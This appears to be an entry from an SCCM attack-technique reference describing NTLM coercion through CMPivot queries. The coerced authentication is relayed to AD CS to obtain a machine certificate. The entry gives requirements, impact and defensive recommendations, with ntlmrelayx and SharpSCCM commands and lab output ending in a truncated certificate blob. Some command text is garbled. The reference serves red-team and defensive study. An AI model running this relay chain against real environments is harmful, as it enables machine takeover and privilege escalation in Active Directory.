# COERCE-1

## Description
NTLM coercion leveraging CMPivot queries

## MITRE ATT&CK TTPs
- [T1187] (https://attack.mitre.org/techniques/T1187/) - Forced Authentication

## Requirements
- Run CMPivot permission on the Collection
- Read permission on Inventory Reports
- Read permissions on Devices and Collections.

## Summary
CMPivot queries can be used to coerce SMB authentication from SCCM client hosts

A user with CMPivot query execution permissions can trigger a query pointing to a UNC path. This will coerce the SYSTEM account of the query target to authenticate against the resource at the UNC path.

SMB authentication can be relayed to a CA in the environment. If a vulnerable template exists then a certificate that allows for authentication can be obtained.

## Impact
This technique allows for taking over a machine object and privilege escalation within Active Directory environments.

## Defensive IDs
Some recommendations:

Disable NTLM where possible
Enforce Extended Protection for Authentication (EPA) along with SMB and LDAP signing. 
Prioritize Kerberos authentication and harden services like ADCS and IIS to block common relay paths.

## Examples
### CMPivot Coerce

Setup a listening relay server such as ntlmrelayx:
```
root@WORKSTATION$ proxychains python3 ntmrelayx.py -debug -smb2support --no-http-server \
-target http://10.0.0.6/certsrv/certrqus.asp --adcs —template "Machine"

[proxychains] DLL init: proxychains-ng 4.14
Impacket vo.10.0 - Copyright 2022 SecureAuth Corporation
[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.10.0-py3.9.egg/impacket
[+] Protocol Client SMB loaded..
[+] Protocol Protocol
```

Trigger a FileContent query. Here we use SharpSCCMs admin-service command against the '\\CLIENT1\test' UNC path:
```
C: \Users\LabAdmin\Desktop\shared>SharpSCM.exe invoke admin-service -q FileContent('\\CLIENT1\test') - r 16777220 -d 3

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: CM1. corp.contoso.com
[+] Site code: CHQ
[+] Sending query to AdminService
[+] URL: "https://CM1.corp.contoso.com/AdminService/v1.0/Device(16777220)/AdminService-RunCMPivot"
[!] Received a 400 ('Bad request') response from the API. Falling back to SMS Provider method
[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: CM1.corp.contoso.com
[+] Site code: CHO
[+] Using WMI provider: M1. corp. contoso.com
[+] Connecting to ||CM1. corp. contoso. com\root\SMS|site_CHQ
[+] Fallback Method call succeeded
[+] Attempt 1 of 5: Checking for query
```

Wait for the relay server to do it's job and get us that b64 certificate blob:
```
[*] Servers started, waiting for connections
[*] SMBD- Thread-4: Received connection from 192.168.1.14, attacking target http://10.0.0.6
[proxychains] Strict chain ... 127.0.0.1:9191 ... 10.0.0.6:80 0K
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.0.0.6 as CORP/GW1$ SUCCEED
[*] No more targets
[*] SMBD-Thread-6: Connection from 192.168.1.14 controlled, but there are no more targets left!
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate..
[*] No more targets
[*] SMBD- Thread -7: Connection from 192.168.1.14 controlled, but there are no more targets left!
[*] GOT CERTIFICATE! ID 3
[*] Base64 certificate of user GW1$:
MIIRFQBAZCCEM8GCSqGSIb3DQEHAaCCEMAEghC8MIIQuDCCBu8GCSqGSb3DQEHBqCCBuAwggbcAgEAMIIG1QYJKoZIhvcNAQ
```

## References
- Microsoft, [Changes to CMPivot - ConfigurationManager] (https://learn.microsoft.com/en-us/intune/configmgr/core/servers/manage/cmpivot-changes)
- Chris Thompson, [Coercing NTLM Authentication from SCCM] (https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)
-  Chris Thompson, [Relaying NTLM Authentication from SCCM client] (https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
- Duane Michael, [The Phantom Credentials of SCCM: Why the NAA Won't Die] (https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
